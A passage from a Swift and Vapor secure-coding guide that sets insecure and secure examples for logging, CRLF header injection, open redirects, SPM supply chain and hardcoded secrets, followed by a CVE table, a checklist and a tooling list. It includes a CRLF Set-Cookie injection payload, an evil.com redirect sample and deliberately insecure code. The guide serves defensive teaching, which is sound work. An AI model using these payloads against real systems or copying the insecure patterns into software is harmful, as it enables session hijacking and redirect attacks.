print("User email: \(user.email)")

// ❌ INSECURE — .public opts out of redaction entirely
logger.info("Auth token: \(authToken, privacy: .public)")
logger.debug("User: \(user.email, privacy: .public)")

// ✅ SECURE — .private (default): redacted as <private> outside dev devices
logger.info("Session started for user: \(userId, privacy: .private)")
logger.error("Auth failure for account: \(accountId, privacy: .private)")

// ✅ SECURE — .sensitive (iOS 17+): hash-based redaction for correlation without exposure
logger.info("Processing request for: \(userEmail, privacy: .sensitive)")

// ✅ SECURE — debug output gated behind compile flag
#if DEBUG
print("Debug token: \(authToken)")
#endif
```

---

## 16. Vapor Request Smuggling and Header Injection

**Vulnerability:** HTTP response headers built from user-supplied strings are vulnerable to CRLF injection. Inserting `\r\n` into a header value terminates the current header and begins a new one — enabling `Set-Cookie` injection, cache poisoning, or HTTP response splitting. Vapor's `HTTPHeaders` API does not sanitize CRLF in values as of Vapor 4. Open redirect via `req.redirect(to:)` with an unvalidated URL is a related risk.

**References:** CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers), CWE-601 (URL Redirection to Untrusted Site)

### Mandatory Rules

- **Strip `\r`, `\n`, and null bytes from all user-supplied values** before inserting into response headers.
- **Use `req.redirect(to:)` only with validated, allowlisted URLs** — never redirect to a URL built from raw request parameters.
- **Add security headers to all responses via Vapor middleware**: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`.
- **Never reflect request headers directly into response headers** without sanitization.

```swift
// ❌ INSECURE — CRLF injection: userValue = "ok\r\nSet-Cookie: session=attacker"
func handler(_ req: Request) async throws -> Response {
    let userValue = req.query["header"] ?? ""
    return Response(status: .ok, headers: HTTPHeaders([("X-Custom", userValue)]))
}

// ❌ INSECURE — open redirect
func redirectHandler(_ req: Request) async throws -> Response {
    let dest = req.query["next"] ?? "/"
    return req.redirect(to: dest)  // attacker sends next=https://evil.com
}

// ✅ SECURE — strip CRLF before header insertion
func sanitizeHeaderValue(_ value: String) -> String {
    value
        .replacingOccurrences(of: "\r", with: "")
        .replacingOccurrences(of: "\n", with: "")
        .replacingOccurrences(of: "\0", with: "")
}

func handler(_ req: Request) async throws -> Response {
    let raw = req.query["header"] ?? ""
    let safeValue = sanitizeHeaderValue(raw)
    return Response(status: .ok, headers: HTTPHeaders([("X-Custom", safeValue)]))
}

// ✅ SECURE — allowlisted redirect destinations
func redirectHandler(_ req: Request) async throws -> Response {
    let allowed = ["/home", "/dashboard", "/profile"]
    let dest = req.query["next"] ?? "/home"
    guard allowed.contains(dest) else {
        return req.redirect(to: "/home")
    }
    return req.redirect(to: dest)
}

// ✅ SECURE — security headers middleware
struct SecurityHeadersMiddleware: AsyncMiddleware {
    func respond(to request: Request, chainingTo next: AsyncResponder) async throws -> Response {
        let response = try await next.respond(to: request)
        response.headers.add(name: "X-Content-Type-Options", value: "nosniff")
        response.headers.add(name: "X-Frame-Options", value: "DENY")
        response.headers.add(name: "Referrer-Policy", value: "strict-origin-when-cross-origin")
        response.headers.add(name: "Strict-Transport-Security",
                             value: "max-age=31536000; includeSubDomains")
        return response
    }
}
```

---

## 17. Swift Package Manager Supply Chain

**Vulnerability:** SPM resolves `.from("X.Y.Z")` version ranges to the latest compatible version on each fresh build without a committed `Package.resolved`. A compromised package maintainer publishing a new minor version silently introduces malicious code into any project that hasn't pinned. Binary targets (`binaryTarget`) without a `.checksum` field accept any zip from the URL — a CDN compromise delivers an arbitrary XCFramework. Internal package names not claimed in the public registry are vulnerable to dependency confusion.

**References:** CWE-494 (Download of Code Without Integrity Check)

### Mandatory Rules

- **Commit `Package.resolved` to version control** — it pins exact resolved versions with checksums; never add it to `.gitignore`.
- **Prefer `.exact("X.Y.Z")` over `.from("X.Y.Z")`** for all security-sensitive dependencies.
- **Always specify `.checksum` for `binaryTarget`** — the SHA256 of the XCFramework zip must be hardcoded in `Package.swift`.
- **Audit new SPM dependencies before adding** with `swift package show-dependencies` and `osv-scanner`.
- **Claim internal package names in the public SPM index** to prevent dependency confusion attacks.

```swift
// Package.swift

// ❌ INSECURE — floating range: 4.1.0...4.x.x auto-accepted without review
.package(url: "https://github.com/vapor/vapor.git", from: "4.0.0"),

// ❌ INSECURE — binary target without checksum: accepts any content from URL
.binaryTarget(
    name: "SomeSDK",
    url: "https://cdn.example.com/SomeSDK-2.0.0.zip"
    // missing checksum: any content accepted
),

// ✅ SECURE — exact version pinned; bump is a deliberate PR change
.package(url: "https://github.com/vapor/vapor.git", exact: "4.99.2"),
.package(url: "https://github.com/vapor/jwt-kit.git", exact: "4.13.2"),

// ✅ SECURE — binary target with SHA256 checksum
.binaryTarget(
    name: "SomeSDK",
    url: "https://cdn.example.com/SomeSDK-2.0.0.zip",
    checksum: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
),
```

```bash
# Audit resolved dependency tree for known CVEs
osv-scanner --lockfile Package.resolved

# Review full dependency tree before adding a new package
swift package show-dependencies --format json
```

---

## 18. Hardcoded Secrets and `#if DEBUG` Leaks

**Vulnerability:** Any string literal in a Swift binary is extractable with `strings MyApp` or Hopper/class-dump. API keys, signing secrets, and private endpoints embedded in source are exposed to any user who downloads the app from the App Store. `#if DEBUG` blocks that weaken security configuration (e.g., `allowsAnyHTTPSCertificate = true`) silently ship in debug builds. `ProcessInfo.processInfo.environment` on iOS contains only the launch environment set by Xcode — it is not a secure store. `.xcconfig` files checked into git with real keys expose secrets in repository history.

**References:** CWE-798 (Use of Hard-coded Credentials), CWE-312 (Cleartext Storage of Sensitive Information)

### Mandatory Rules

- **For server-side Vapor: load all secrets via `Environment.get("KEY")`** — set in the hosting platform's secret store, never in source.
- **For iOS/macOS clients: never embed server-side API keys** — use a backend proxy endpoint instead; there is no safe way to protect a secret in an app binary.
- **Add `.xcconfig`, `*.pem`, `*.p12`, and secrets files to `.gitignore`** — and scan with Gitleaks in CI.
- **Gate all `#if DEBUG` security relaxations with a build configuration check** — never ship debug TLS settings or logging to production.
- **Treat every string in the binary as publicly readable** — if it needs to be secret, it does not belong in the client.

```swift
// ❌ INSECURE — extractable via: strings MyApp.app/MyApp | grep sk-
let openAIKey = "sk-1234567890abcdef1234567890abcdef"
let stripeKey = "pk_live_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

// ❌ INSECURE — Vapor hardcoded secret
app.jwt.signers.use(.hs256(key: "hardcoded_jwt_signing_secret"))

// ❌ INSECURE — TLS bypass ships in debug builds without separate scheme guard
#if DEBUG
session.serverTrustManager = ServerTrustManager(evaluators: [
    "api.myapp.com": DisabledTrustEvaluator()
])
#endif

// ✅ SECURE — Vapor: load from environment at startup
guard let jwtSecret = Environment.get("JWT_SECRET"),
      jwtSecret.utf8.count >= 32 else {
    app.logger.critical("JWT_SECRET environment variable missing or too short")
    throw EnvironmentError.missingSecret("JWT_SECRET")
}
app.jwt.signers.use(.hs256(key: jwtSecret))

// ✅ SECURE — iOS: use backend proxy; API key lives server-side only
func fetchSuggestions(query: String) async throws -> [Suggestion] {
    // Client calls own backend; backend calls OpenAI with server-side key
    let url = URL(string: "https://api.myapp.com/suggestions?q=\(query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)!)")!
    let (data, _) = try await URLSession.shared.data(from: url)
    return try JSONDecoder().decode([Suggestion].self, from: data)
}
```

---

## CVE Reference Table

| CVE | Severity | Component | Description | Fixed In |
|-----|----------|-----------|-------------|----------|
| CVE-2022-22620 | High (8.8) | WebKit / Safari | Use-after-free in WebKit history; processing maliciously crafted web content leads to arbitrary code execution. Exploited in the wild. | iOS 15.3.1, macOS Monterey 12.2.1, Safari 15.3 |
| CVE-2023-41993 | High (8.8) | WebKit | Improper checks; processing web content may lead to arbitrary code execution. Actively exploited against iOS < 16.7. CISA KEV listed. | iOS 16.7, iOS 17.0.1, macOS Sonoma 14 |
| CVE-2023-42833 | High (8.8) | WebKit | Correctness issue (CWE-94); processing web content may lead to arbitrary code execution. | iOS 17, macOS Sonoma 14, Safari 17 |
| CVE-2024-23296 | High (7.8) | RTKit | Out-of-bounds write (CWE-787); an attacker with kernel read/write capability can bypass kernel memory protections. Exploited in the wild. | iOS 17.4, iPadOS 17.4 |
| CVE-2024-44309 | Medium (6.1) | WebKit | Cookie management issue; processing maliciously crafted web content may lead to cross-site scripting. Exploited in the wild on Intel-based Macs. | iOS 17.7.2, iOS 18.1.1, macOS Sequoia 15.1.1, Safari 18.1.1 |
| CVE-2024-38366 | Critical (10.0) | CocoaPods Trunk | Shell injection via vulnerable RFC822 email validation library; allows RCE on the CocoaPods Trunk server enabling malicious pod content injection into the supply chain. | CocoaPods Trunk (October 2023 patch) |
| CVE-2024-38368 | Critical (9.3) | CocoaPods Trunk | Unclaimed pod takeover via public API and exposed email address; allows attacker to claim abandoned pods and inject malicious source. ~1,800 pods affected. | CocoaPods Trunk (October 2023 patch) |
| CVE-2024-21631 | Medium (6.5) | Vapor / swift-nio | Integer overflow in URI parsing (`uint16_t` index overflow); allows host spoofing in URL validation, potentially bypassing SSRF and redirect allowlists. | Vapor 4.90.0 |
| CVE-2023-44386 | Medium (5.3) | Vapor | Incorrect HTTP/1.x error handling triggers `preconditionFailure` in swift-nio; remote attacker can send a malformed request to crash the server process (DoS). | Vapor 4.84.2 |

---

## Security Checklist

### Swift Language Safety
- [ ] Force-unwrap (`!`) never applied to values from network responses, user input, or deserialized data
- [ ] `try!` replaced with `do { try } catch` for all operations on untrusted input
- [ ] `.first!`, `.last!`, and index subscripts guarded by count checks on external collections
- [ ] `as!` casts replaced with `as?` plus nil handling when casting `Any` from JSON
- [ ] All `guard let` failure branches produce structured errors, not silent fallthrough
- [ ] `UnsafePointer` / `UnsafeMutableRawPointer` usage reviewed for bounds checks
- [ ] `withUnsafeBytes` closures do not escape the pointer outside the closure
- [ ] `assumingMemoryBound(to:)` only called with proven type correctness
- [ ] Security-critical classes declared `final` to prevent subclassing

### Codable / Serialization
- [ ] Separate input DTOs defined for all external-facing decode operations
- [ ] Domain models with privileged fields never decoded directly from request bodies
- [ ] `CodingKeys` explicitly enumerated on all input DTOs
- [ ] Decoded values validated for semantic correctness (ranges, formats) after decode
- [ ] `AnyCodable` / `[String: Any]` patterns avoided or cast with `as?` only
- [ ] `JSONDecoder` date strategies validated against reasonable date ranges
- [ ] Enum raw values from external JSON validated against expected members

### Cryptography (CryptoKit)
- [ ] Passwords never hashed with SHA-256 or any fast hash — PBKDF2/Argon2id used
- [ ] `AES.GCM.Nonce()` called fresh per encryption — no nonce reuse with the same key
- [ ] `SymmetricKey` not derived directly from `Data(password.utf8)` — PBKDF2 used
- [ ] `SecRandomCopyBytes` used for all security token generation — not `Int.random` or `UUID`
- [ ] `SymmetricKey` and private keys stored in Keychain — not in memory beyond operation lifetime
- [ ] AES-256-GCM or ChaChaPoly used for symmetric encryption — not AES-CBC via CommonCrypto
- [ ] PBKDF2 iteration count at or above 100,000 (SHA-256 PRF)
- [ ] Unique per-user salt stored alongside PBKDF2-derived key material

### Data Storage
- [ ] Auth tokens and API keys stored in Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`
- [ ] No secrets stored in `UserDefaults`, `@AppStorage`, or `@SceneStorage`
- [ ] Sensitive files created with `NSFileProtectionComplete` attribute
- [ ] `Info.plist` audited for embedded API keys or secrets (CI lint check)
- [ ] Asset catalogs checked for embedded credentials
- [ ] `NSUbiquitousKeyValueStore` not used for secrets (iCloud sync)
- [ ] `allowsBackup` set appropriately for sensitive data directories

### Network / TLS
- [ ] ATS (App Transport Security) not globally disabled in `Info.plist`
- [ ] No `NSAllowsArbitraryLoads: true` without documented security exception
- [ ] Certificate pinning implemented for all sensitive API endpoints
- [ ] TLS 1.2 minimum enforced; TLS 1.0/1.1 disabled
- [ ] `URLSession` delegate not overriding certificate validation to always-accept
- [ ] WKWebView navigation restricted to allowlisted hosts for sensitive content
- [ ] Deep link and Universal Link URL parameters validated before use

### Vapor Server-Side
- [ ] All SQL queries use Fluent ORM builders or `\(bind: value)` syntax — never `\(value)`
- [ ] Table names and column names never derived from user input without allowlist
- [ ] Leaf templates never use `#unsafeHTML()` with user-controlled content
- [ ] Leaf template names derived from allowlist — never from raw request parameters
- [ ] JWT `verify(using:)` implements `exp`, `iss`, and `aud` validation
- [ ] JWT signing key loaded from environment variable — never hardcoded
- [ ] Session cookies configured with `isHTTPOnly: true`, `isSecure: true`, `sameSite: .lax`
- [ ] All response headers sanitized — no CRLF from user input
- [ ] Security headers middleware applied: CSP, X-Frame-Options, X-Content-Type-Options, HSTS
- [ ] `req.redirect(to:)` only used with allowlisted or validated destinations
- [ ] Input length limits enforced at the route handler level before regex or processing

### Concurrency
- [ ] Swift 6 strict concurrency enabled (`SWIFT_STRICT_CONCURRENCY = complete`)
- [ ] Shared mutable state modeled as `actor` — not `class` with manual locking
- [ ] `nonisolated(unsafe)` not used on security-critical state
- [ ] `withUnsafeContinuation` calls resume exactly once on all code paths
- [ ] `Task.detached` usage reviewed — actor isolation correctly maintained
- [ ] Vapor global `var` state replaced with `actor` or `@Sendable` closures

### Supply Chain
- [ ] `Package.resolved` committed to version control — not in `.gitignore`
- [ ] Exact version pinning (`.exact("X.Y.Z")`) used for security-sensitive dependencies
- [ ] `binaryTarget` entries include `.checksum` (SHA256 of XCFramework zip)
- [ ] `osv-scanner --lockfile Package.resolved` run in CI pipeline
- [ ] New dependencies reviewed for maintenance activity, vulnerability history, and popularity
- [ ] Internal package names claimed in public SPM index to prevent dependency confusion
- [ ] Gitleaks or TruffleHog running as pre-commit hook and in CI

---

## Tooling

| Tool | Purpose | Command |
|------|---------|---------|
| [Xcode Static Analyzer](https://developer.apple.com/documentation/xcode/improving-your-app-s-performance) | Memory management, nil dereference, use-after-free detection built into Xcode | Product → Analyze (Shift+Cmd+B) |
| [SwiftLint](https://github.com/realm/SwiftLint) | Enforce Swift style rules including security-relevant patterns (force-cast, force-try, force-unwrap) | `swiftlint lint --strict` |
| [swift-format](https://github.com/apple/swift-format) | Code formatting; pair with SwiftLint for enforcement | `swift-format lint -r Sources/` |
| [osv-scanner](https://github.com/google/osv-scanner) | Scan `Package.resolved` for known CVEs against OSV database | `osv-scanner --lockfile Package.resolved` |
| [Semgrep Swift rules](https://semgrep.dev/r?lang=swift) | SAST rules for Swift: hardcoded secrets, force-unwrap on network data, weak crypto | `semgrep --config=p/swift .` |
| [MobSF (Mobile Security Framework)](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Automated static + dynamic analysis of iOS IPA files: binary analysis, plist review, API abuse | `python3 manage.py runserver` (web UI) |
| [objection](https://github.com/sensepost/objection) | Runtime mobile exploration via Frida: Keychain dump, bypass jailbreak detection, hook Swift methods | `objection -g com.myapp.MyApp explore` |
| [Frida](https://frida.re) | Dynamic instrumentation: hook Swift/ObjC methods, trace crypto calls, intercept network | `frida -U -n MyApp -l hook_script.js` |
| [Hopper Disassembler](https://www.hopperapp.com) | Reverse-engineer Swift binary: find hardcoded strings, trace execution paths | GUI — drag IPA into Hopper |
| [dsdump / class-dump-swift](https://github.com/DerekSelander/dsdump) | Dump Swift class and method metadata from Mach-O binary | `dsdump --swift MyApp.app/MyApp` |
| [codesign](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/) | Verify entitlements and code signing configuration | `codesign -dv --entitlements - MyApp.app` |
| [idevicesyslog](https://libimobiledevice.org) | Stream device syslog to surface `print()` / `NSLog` output from a connected device | `idevicesyslog -u UDID \| grep MyApp` |
| [Instruments — Memory Debugger](https://developer.apple.com/tutorials/data/documentation/xcode/gathering-information-about-memory-use.pdf) | Detect retain cycles, leaks in security-sensitive objects (e.g., in-memory key material) | Xcode → Product → Profile → Leaks |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | Secret scanning in git history and working tree | `gitleaks detect --source . --verbose` |
| [xcinfo / xcode-select](https://developer.apple.com/xcode/) | Verify Xcode toolchain integrity; use official downloads only | `codesign -v /Applications/Xcode.app` |
